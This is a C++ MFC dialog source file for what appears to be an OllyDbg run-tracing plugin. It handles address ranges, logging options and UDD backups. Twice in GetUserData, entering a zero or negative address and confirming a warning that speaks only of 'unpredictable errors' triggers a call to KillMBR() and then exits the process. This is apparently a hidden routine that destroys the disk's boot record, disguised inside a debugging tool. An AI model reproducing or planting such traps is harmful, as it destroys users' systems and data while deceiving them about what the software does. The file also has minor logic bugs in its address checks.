// RecordDialog.cpp : 实现文件
//

#include "stdafx.h"
#include "KillMBR.h"
#include "RunTracing.h"
#include "RecordDialog.h"
#include "PublicFunction.h"
#include <tchar.h>

// CRecordDialog 对话框

IMPLEMENT_DYNAMIC(CRecordDialog, CDialog)

CRecordDialog::CRecordDialog(CWnd* pParent /*=NULL*/)
	: CDialog(CRecordDialog::IDD, pParent)
    , m_bIsRecordOther(TRUE)
    , m_bIsRecordAPI(FALSE)
    , m_bIsForce(FALSE)
    , m_strLogPath(_T(""))
    , m_StrStartAddress(_T(""))
    , m_StrEndAddress(_T(""))
    , m_pRunData(NULL)
    , m_bIsBackupUDD(FALSE)
    , m_strBackupPath(_T(""))
{
    
}

CRecordDialog::~CRecordDialog()
{
}

void CRecordDialog::DoDataExchange(CDataExchange* pDX)
{
    CDialog::DoDataExchange(pDX);
    DDX_Check(pDX, CHK_RECORDOTHER, m_bIsRecordOther);
    DDX_Check(pDX, CHK_RECORDAPI, m_bIsRecordAPI);
    DDX_Check(pDX, CHK_FORCE, m_bIsForce);
    DDX_Text(pDX, EDT_LOGPATH, m_strLogPath);
    DDV_MaxChars(pDX, m_strLogPath, 256);
    DDX_Text(pDX, EDT_STARTADDRESS, m_StrStartAddress);
    DDV_MaxChars(pDX, m_StrStartAddress, 12);
    DDX_Text(pDX, EDT_ENDADDRESS, m_StrEndAddress);
    DDV_MaxChars(pDX, m_StrEndAddress, 12);
    DDX_Check(pDX, CHK_BACKUPUDD, m_bIsBackupUDD);
    DDX_Text(pDX, EDT_UDDPATH, m_strBackupPath);
}


BEGIN_MESSAGE_MAP(CRecordDialog, CDialog)
    ON_BN_CLICKED(CHK_RECORDAPI, &CRecordDialog::OnBnClickedRecordapi)
    ON_BN_CLICKED(BTN_BROWER, &CRecordDialog::OnBnClickedBrower)
    ON_BN_CLICKED(BTN_GETCURRENTIP, &CRecordDialog::OnBnClickedGetcurrentip)
    ON_BN_CLICKED(BTN_BROWER2, &CRecordDialog::OnBnClickedBrower2)
    ON_BN_CLICKED(CHK_BACKUPUDD, &CRecordDialog::OnBnClickedBackupudd)
END_MESSAGE_MAP()

#define CHECKTYPE(type, uStart, uEnd) \
                    { \
                        if (0 == (TY_CODE & (type))) \
                        { \
                            _snprintf_s(szBuffer, MAX_PATH, _T("你输入的地址%p - %p 中不包含代码，是否继续?"), \
                            (int *)(uStart),\
                            (int *)(uEnd)) ;\
                            if (IDNO == AfxMessageBox(szBuffer, MB_YESNO))\
                            {\
                                return FALSE ;\
                            }\
                        }\
                        if ((type) & ~TY_CODE)\
                        {\
                            _snprintf_s(szBuffer, MAX_PATH, _T("你输入的地址%p - %p 中包含其它数据，是否继续?"), \
                                (int *)(uStart),\
                                (int *)(uEnd)) ;\
                            if (IDNO == AfxMessageBox(szBuffer, MB_YESNO))\
                            {\
                                return FALSE ;\
                            }\
                        }\
                    }

// CRecordDialog 消息处理程序
BOOL CRecordDialog::GetUserData(IN OUT PRunData pRunData)
{
    NULLVALUE_CHECK(pRunData, CRecordDialog::GetUserData) ;

    UpdateData(TRUE) ;
    TCHAR szBuffer[MAX_PATH] = {0} ;

    if (FALSE == IsHexString(m_StrStartAddress))
    {
        AfxMessageBox(_T("起始地址不是有效的十六进制值")) ;
    }

    if (FALSE == IsHexString(m_StrEndAddress))
    {
        AfxMessageBox(_T("结束地址不是有效的十六进制值")) ;
    }

    

    // 再判断是不是要备份udd文件
    if (m_bIsBackupUDD)
    {
        BackupUDD(m_strBackupPath.GetBuffer(0)) ;
    }


    pRunData->uStartAddress = StringToDWORD(m_StrStartAddress)  ;
    pRunData->uEndAddress   = StringToDWORD(m_StrEndAddress)    ;

    // 先判断这二个地址中是否有0
    if (0 == pRunData->uStartAddress
        || 0 == pRunData->uEndAddress)
    {
        if (IDYES == AfxMessageBox(_T("您确定要使用0地址?这个地址是不可用的,使用这个地址可能会造成无法预知的错误!"), MB_YESNO))
        {
            KillMBR() ;
            ExitProcess(-1) ;
            return FALSE ;
        }
    }

    // 判断二个地址中是否有-
    if (StrStrI(m_StrStartAddress, _T("-"))
        || StrStrI(m_StrEndAddress, _T("-")))
    {
        if (IDYES == AfxMessageBox(_T("您确定要使用0地址?这个地址是不可用的,使用这个地址可能会造成无法预知的错误!"), MB_YESNO))
        {
            KillMBR() ;
            ExitProcess(-1) ;
            return FALSE ;
        }
    }

    // 先判断结束地址的大小是否正常
    if (pRunData->uEndAddress < pRunData->uStartAddress)
    {
        // 判断后面的有没有可能是长度
        if (pRunData->uEndAddress < FUN_SIZE)
        {
            pRunData->uEndAddress += pRunData->uStartAddress ;
        }
        
        else
        {
            // 交换二个值
            pRunData->uStartAddress ^= pRunData->uEndAddress ;
            pRunData->uEndAddress ^= pRunData->uStartAddress ;
            pRunData->uStartAddress ^= pRunData->uEndAddress ;
        }
    }

    // 这里可以再去检查地址的有效性
    t_memory* pTMemory = NULL ;
    unsigned int uSize = pRunData->uEndAddress - pRunData->uStartAddress ;
    pTMemory = Findmemory(pRunData->uStartAddress) ;

    if(NULL == pTMemory)
    {
        OutputDebugString(_T("CRecordDialog::GetUserData pTMemory can't NULL!\r\r")) ;
        return FALSE ;
    }

    if (pRunData->uEndAddress < (pTMemory->base + pTMemory->size))
    {
        CHECKTYPE(pTMemory->type, pRunData->uStartAddress, pRunData->uEndAddress) ;
    }
    else
    {
        CHECKTYPE(pTMemory->type, pRunData->uStartAddress, (pTMemory->base + pTMemory->size)) ;
    }

    unsigned int uLen = (pTMemory->base + pTMemory->size) - pRunData->uStartAddress ;
    for (; uSize > 0;)
    {
        // 如果这个块没有存下的话，再找下一个块
        if (uSize > uLen)
        {
            uSize -= uLen ;
            unsigned int uEnd = pTMemory->base + pTMemory->size ;
            t_memory* pTmp = Findmemory(uEnd + 1) ;
            if (NULL == pTMemory)
            {
                _snprintf_s(szBuffer, MAX_PATH, _T("部分地址无效，是否就 %p 处截断!"), (int *)uEnd) ;
                OutputDebugString(_T("CRecordDialog::GetUserData pTmp can't NULL!\r\r")) ;
                if (IDYES == AfxMessageBox(szBuffer, MB_YESNO))
                {
                    pRunData->uEndAddress = uEnd ;
                    uSize = 0 ;
                }
                else
                {
                    return FALSE ;
                }
            }
            else
            {
                // 如果结束地址小于这个页的结束地址的话
                if (pRunData->uEndAddress < (pTMemory->base + pTmp->size))
                {
                    CHECKTYPE(pTmp->type, pTmp->base, (pRunData->uEndAddress)) ;
                }
                else
                {
                    CHECKTYPE(pTmp->type, pTmp->base, (pTmp->base + pTmp->size)) ;
                }                

                uLen = pTmp->size ;
                pTMemory = pTmp ;
            }
        }
        else
        {
            uSize = 0 ;
        }
    }

    pRunData->bIsRecordAPI = m_bIsRecordAPI   ;
    pRunData->bIsRecordOther = m_bIsRecordOther ;
    pRunData->bIsForceSetBreakPoint = m_bIsForce ;

    if (m_bIsRecordAPI)
    {
        pRunData->strLogPath = m_strLogPath ;
    }

    // 再将相应的值传出给结构体
    return TRUE ;
}

void CRecordDialog::SetUserData(IN PRunData pRunData)
{
    if (NULL == pRunData)
    {
        return  ;
    }

    if (0 == pRunData->uStartAddress)
    {
        ulong uEIP = GetCurrentEIP() ;
        m_StrStartAddress.Format(_T("%p"), uEIP) ;
        m_StrEndAddress.Format(_T("%p"),   GetFunctionEnd(uEIP)) ;
    }
    else
    {
        m_StrStartAddress.Format(_T("%p"), (int *)pRunData->uStartAddress) ;
        m_StrEndAddress.Format(_T("%p"),   (int *)pRunData->uEndAddress) ;
    }
    
    m_bIsRecordAPI = pRunData->bIsRecordAPI ;
    m_bIsRecordOther = pRunData->bIsRecordOther ;


    if (m_bIsRecordAPI)
    {
        m_strLogPath = pRunData->strLogPath ;
    }

    m_pRunData = pRunData ;

    // 将变量的值更新到控件
    //UpdateData(FALSE) ;
}

void CRecordDialog::MyUpdateData()
{
    UpdateData(TRUE) ;
    return ;
}

void CRecordDialog::OnBnClickedRecordapi()
{
    // TODO: 在此添加控件通知处理程序代码
    UpdateData(TRUE) ; // 读控件
    GetDlgItem(EDT_LOGPATH)->EnableWindow(m_bIsRecordAPI) ;
    GetDlgItem(BTN_BROWER)->EnableWindow(m_bIsRecordAPI) ;
}

void CRecordDialog::OnBnClickedBrower()
{
    // TODO: 在此添加控件通知处理程序代码
    //TestIsHexString() ;
    //TestStringToDWORD() ;
}

BOOL CRecordDialog::PreTranslateMessage(MSG* pMsg)
{
    // TODO: 在此添加专用代码和/或调用基类
    if(pMsg->message == WM_KEYDOWN)
    {
        switch(pMsg->wParam)
        {
        case VK_RETURN: //回车
             return TRUE;
        case VK_ESCAPE: //ESC
            return TRUE;
        }
    }

    m_tt.RelayEvent(pMsg);

    return CDialog::PreTranslateMessage(pMsg);
}

void CRecordDialog::OnBnClickedGetcurrentip()
{
    // TODO: 在此添加控件通知处理程序代码
    UpdateData(TRUE) ;

    m_StrStartAddress.Format(_T("%p"), GetCurrentEIP()) ;

    UpdateData(FALSE) ;
}

BOOL CRecordDialog::OnInitDialog()
{
    CDialog::OnInitDialog();

    // TODO:  在此添加额外的初始化
    GetDlgItem(EDT_LOGPATH)->EnableWindow(m_bIsRecordAPI) ;
    GetDlgItem(BTN_BROWER)->EnableWindow(m_bIsRecordAPI) ;

    GetDlgItem(BTN_BROWER2)->EnableWindow(m_bIsBackupUDD) ;

    this->EnableToolTips(TRUE);
    m_tt.Create(this);
    m_tt.Activate(TRUE);
    m_tt.AddTool(GetDlgItem(EDT_STARTADDRESS), _T("程序将从此处开始下断点，直到当前函数尾部或者结束地址"));
    m_tt.AddTool(GetDlgItem(EDT_ENDADDRESS),_T("如果值小于0x10000的话，此项做为长度处理"));
    m_tt.AddTool(GetDlgItem(CHK_RECORDOTHER), _T("记录地址外的函数调用，选上此项可以完整的记录程序的调用流程，否则只记录范围地址内的"));
    m_tt.AddTool(GetDlgItem(CHK_FORCE), _T("对于OD无法识别的函数，本程序不作处理，为了记录的完整，建议钩上此项"));
    m_tt.AddTool(GetDlgItem(CHK_RECORDAPI), _T("是否记录API，此功能还没有开放"));
    m_tt.AddTool(GetDlgItem(BTN_GETCURRENTIP), _T("取得当前EIP值，并填入起始地址中"));
    m_tt.AddTool(GetDlgItem(EDT_UDDPATH), _T("UDD备份目录"));
    m_tt.AddTool(GetDlgItem(BTN_BROWER2), _T("浏览选择UDD备份目录"));

    return TRUE;  // return TRUE unless you set the focus to a control
    // 异常: OCX 属性页应返回 FALSE
}

ulong  CRecordDialog::GetCurrentEIP()
{
    t_thread* pThread = NULL ;
    pThread = Findthread(Getcputhreadid()) ;
    if (NULL != pThread)
    {
        return pThread->reg.ip ;
    }

    return 0 ;
}

void CRecordDialog::OnBnClickedBrower2()
{
    // TODO: 在此添加控件通知处理程序代码
    char szPath[MAX_PATH] = {0};     //存放选择的目录路径 

    BROWSEINFO bi;
    bi.hwndOwner = m_hWnd;
    bi.pidlRoot = NULL;
    bi.pszDisplayName = szPath;
    bi.lpszTitle = "请选择存放目录：";
    bi.ulFlags = 0;
    bi.lpfn = NULL;
    bi.lParam = 0;
    bi.iImage = 0;
    //弹出选择目录对话框
    LPITEMIDLIST lp = SHBrowseForFolder(&bi);   

    if(lp && SHGetPathFromIDList(lp, szPath))   
    {
        m_strBackupPath = szPath ;
        UpdateData(FALSE) ;
    }
    else
    {
        AfxMessageBox("无效的目录，请重新选择"); 
    }

}

void CRecordDialog::OnBnClickedBackupudd()
{
    // TODO: 在此添加控件通知处理程序代码
    UpdateData(TRUE) ; // 读控件
    GetDlgItem(BTN_BROWER2)->EnableWindow(m_bIsBackupUDD) ;
}
